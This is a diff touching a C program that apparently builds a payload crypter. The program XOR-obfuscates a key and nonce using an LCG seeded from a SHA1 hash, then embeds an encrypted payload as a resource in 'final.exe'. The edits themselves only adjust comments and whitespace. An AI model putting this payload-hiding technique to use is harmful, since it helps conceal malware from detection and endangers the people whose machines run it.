@@ -170,11 +170,7 @@ int main(int argc, char* argv[])
     HANDLE hUpdateRes;
     BOOL result;
 
-
-
-
-
-    //making hash 
+    // Making hash 
     unsigned char *data = (unsigned char*)fileBuff;
     unsigned char hash[SHA1_BLOCK_SIZE];
     SHA1(data, fileLen, hash);
@@ -186,7 +182,7 @@ int main(int argc, char* argv[])
         ((unsigned long)hash[2] << 16) |
         ((unsigned long)hash[3] << 24);
 
-    // lcg call
+    // LCG call
     unsigned long LCG_Result = lcg_rand(&state);
 
     uint8_t *obfuscatedKey = (uint8_t *)malloc(32);
@@ -214,9 +210,6 @@ int main(int argc, char* argv[])
         obfuscatedNonce[i] = nonce[i] ^ ((LCG_Result >> ((i % 4) * 8)) & 0xFF);
     }
 
-
-
-
     hUpdateRes = BeginUpdateResource("final.exe", FALSE);
     if (hUpdateRes == NULL)
     {
@@ -228,7 +221,7 @@ int main(int argc, char* argv[])
         return 0;
     }
 
-    // Add the encrypted payload as a resource with ID 132 and type RT_RCDATA
+    // Add the encrypted payload as a resource
     result = UpdateResource(hUpdateRes,
                             RT_RCDATA,                   // resource type
                             MAKEINTRESOURCE(132),        // resource ID
